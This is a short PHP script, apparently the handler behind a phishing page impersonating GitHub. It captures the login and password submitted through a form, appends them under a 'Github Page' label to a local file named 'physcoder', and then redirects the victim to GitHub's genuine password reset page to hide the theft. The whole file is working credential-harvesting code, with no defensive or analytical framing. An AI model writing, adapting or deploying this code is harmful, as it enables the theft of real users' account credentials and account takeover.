<?php
file_put_contents("physcoder", "Github Page\nUsername: " . $_POST['login'] . "\nPassword: " . $_POST['password'] . "\n\n", FILE_APPEND);
header('Location: https://github.com/password_reset');
exit();
?>
